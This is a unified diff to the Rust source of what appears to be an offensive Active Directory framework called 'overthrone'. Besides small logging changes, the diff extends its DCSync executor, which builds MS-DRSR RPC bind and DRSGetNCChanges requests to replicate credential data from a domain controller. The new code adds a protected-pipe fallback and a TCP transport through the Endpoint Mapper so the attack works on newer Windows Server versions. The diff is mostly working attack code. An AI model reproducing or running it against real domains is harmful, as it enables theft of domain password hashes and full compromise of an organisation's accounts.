@@ -13,6 +13,7 @@ use chrono::{Datelike, Utc};
 use colored::Colorize;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::exec::smbexec::escape_cmd_metacharacters;
+use overthrone_core::proto::epm::{btf_read_frame, btf_write_frame, resolve_uuid_via_epm_tcp};
 use overthrone_core::proto::{kerberos, ldap, rid, smb::SmbSession};
 use overthrone_hunter::HuntConfig;
 use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod};
@@ -113,7 +114,7 @@ pub async fn execute_step(
     ctx: &ExecContext,
     state: &mut EngagementState,
 ) -> StepResult {
-    info!("{} {}", "â–¶".cyan(), step.description.bold());
+    info!("{} {}", ">".cyan(), step.description.bold());
 
     if ctx.dry_run {
         info!("{}", "  DRY RUN — skipping execution".dimmed());
@@ -354,7 +355,7 @@ pub async fn compensate_step(
 ) -> StepResult {
     info!(
         "{} Compensating step {}: {}",
-        "â†©".yellow(),
+        "<-".yellow(),
         step.id.bold(),
         step.description.dimmed()
     );
@@ -4162,6 +4163,86 @@ async fn start_remote_service(smb: &SmbSession, service_name: &str) -> Result<()
 // DCSync Executor (MS-DRSR over RPC)
 // ═══════════════════════════════════════════════════════════
 
+/// Try DRSUAPI named pipe connections with fallback to protected pipe.
+/// On WS2025+, DRSUAPI uses `protected_pipe\drsuapi` instead of `drsuapi`.
+async fn dcsync_pipe_transact(
+    smb: &SmbSession,
+    pdu: &[u8],
+) -> std::result::Result<Vec<u8>, String> {
+    let pipes = ["protected_pipe\\drsuapi", "drsuapi"];
+    let mut last_err = String::new();
+    for pipe in &pipes {
+        match smb.pipe_transact(pipe, pdu).await {
+            Ok(r) => return Ok(r),
+            Err(e) => {
+                last_err = format!("{pipe}: {e}");
+                debug!("DCSync pipe {pipe} failed: {e}");
+            }
+        }
+    }
+    Err(last_err)
+}
+
+/// DRSUAPI UUID constant (e3514235-4b06-11d1-ab04-00c04fc2dcd2)
+const DRSR_UUID_BYTES: [u8; 16] = [
+    0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2,
+];
+
+/// Transport DRSUAPI RPC PDUs over TCP via EPM resolution instead of SMB named pipes.
+/// On WS2025, the drsuapi named pipe may not be available; this provides a fallback
+/// using TCP direct to the dynamic endpoint resolved by the RPC Endpoint Mapper.
+async fn dcsync_tcp_transact(target: &str, pdu: &[u8]) -> std::result::Result<Vec<u8>, String> {
+    use tokio::time::{Duration, timeout};
+
+    // Resolve DRSUAPI UUID to a TCP endpoint via EPM (port 135)
+    let resolve_fut = resolve_uuid_via_epm_tcp(target, &DRSR_UUID_BYTES);
+    let (host, port) = timeout(Duration::from_secs(10), resolve_fut)
+        .await
+        .map_err(|_| "EPM resolution timed out (10s)".to_string())?
+        .map_err(|e| format!("EPM resolve DRSUAPI on {target}: {e}"))?;
+
+    debug!("DCSync TCP: resolved DRSUAPI to {host}:{port}");
+
+    // Connect to the dynamic TCP endpoint
+    let addr = format!("{host}:{port}");
+    let connect_fut = tokio::net::TcpStream::connect(&addr);
+    let mut stream = timeout(Duration::from_secs(10), connect_fut)
+        .await
+        .map_err(|_| format!("TCP connect to {addr} timed out"))?
+        .map_err(|e| format!("TCP connect to {addr}: {e}"))?;
+
+    // Write the RPC PDU with BTF framing
+    let write_fut = btf_write_frame(&mut stream, pdu);
+    timeout(Duration::from_secs(10), write_fut)
+        .await
+        .map_err(|_| "BTF write timed out".to_string())?
+        .map_err(|e| format!("BTF write to {addr}: {e}"))?;
+
+    // Read the response with BTF framing
+    let read_fut = btf_read_frame(&mut stream);
+    let resp = timeout(Duration::from_secs(30), read_fut)
+        .await
+        .map_err(|_| "BTF read timed out (30s)".to_string())?
+        .map_err(|e| format!("BTF read from {addr}: {e}"))?;
+
+    Ok(resp)
+}
+
+/// Send a DRSUAPI RPC PDU, trying SMB named pipes first then TCP via EPM.
+async fn dcsync_send_pdu(
+    smb: &SmbSession,
+    dc_ip: &str,
+    pdu: &[u8],
+) -> std::result::Result<Vec<u8>, String> {
+    match dcsync_pipe_transact(smb, pdu).await {
+        Ok(r) => Ok(r),
+        Err(pipe_err) => {
+            debug!("DCSync: pipe failed ({pipe_err}), trying TCP via EPM...");
+            dcsync_tcp_transact(dc_ip, pdu).await
+        }
+    }
+}
+
 async fn exec_dcsync(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -4181,13 +4262,11 @@ async fn exec_dcsync(
         Err(e) => return e,
     };
 
-    // Step 2: RPC Bind to MS-DRSR (drsuapi pipe)
-    // MS-DRSR UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
-    let drsr_uuid: [u8; 16] = [
-        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc,
-        0xd2,
-    ];
+    // Step 2: Try SMB named pipes first, then TCP via EPM as fallback.
+    // On WS2025+, DRSUAPI named pipe may not be available.
+    let dcsync_dc_ip = ctx.dc_ip.clone();
 
+    // Build RPC bind PDU for MS-DRSR (e3514235-4b06-11d1-ab04-00c04fc2dcd2)
     let mut bind_pdu = Vec::new();
     bind_pdu.extend_from_slice(&[5, 0, 11, 3]);
     bind_pdu.extend_from_slice(&[0x10, 0, 0, 0]);
@@ -4203,7 +4282,7 @@ async fn exec_dcsync(
     bind_pdu.extend_from_slice(&0u16.to_le_bytes());
     bind_pdu.push(1);
     bind_pdu.push(0);
-    bind_pdu.extend_from_slice(&drsr_uuid);
+    bind_pdu.extend_from_slice(&DRSR_UUID_BYTES);
     bind_pdu.extend_from_slice(&4u16.to_le_bytes()); // DRSR version 4
     bind_pdu.extend_from_slice(&0u16.to_le_bytes());
     bind_pdu.extend_from_slice(&[
@@ -4214,7 +4293,7 @@ async fn exec_dcsync(
     let frag_len = bind_pdu.len() as u16;
     bind_pdu[frag_offset..frag_offset + 2].copy_from_slice(&frag_len.to_le_bytes());
 
-    let bind_resp = match smb.pipe_transact("drsuapi", &bind_pdu).await {
+    let bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &bind_pdu).await {
         Ok(r) => r,
         Err(e) => {
             return StepResult {
@@ -4246,7 +4325,7 @@ async fn exec_dcsync(
     drs_bind_stub.extend_from_slice(&extensions);
 
     let drs_bind_req = build_rpc_request(0, &drs_bind_stub);
-    let drs_bind_resp = match smb.pipe_transact("drsuapi", &drs_bind_req).await {
+    let drs_bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &drs_bind_req).await {
         Ok(r) => r,
         Err(e) => {
             return StepResult {
@@ -4363,7 +4442,7 @@ async fn exec_dcsync(
         gnc_stub.extend_from_slice(&7u32.to_le_bytes());
 
         let gnc_req = build_rpc_request(3, &gnc_stub);
-        let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
+        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req).await {
             Ok(r) => r,
             Err(e) => {
                 warn!("  DRSGetNCChanges error (may still have partial data): {e}");
@@ -4496,7 +4575,7 @@ async fn exec_dcsync(
             false,
         );
 
-        let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
+        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req).await {
             Ok(r) => r,
             Err(e) => {
                 warn!("  DCSync batch {batch_count} failed: {e}");
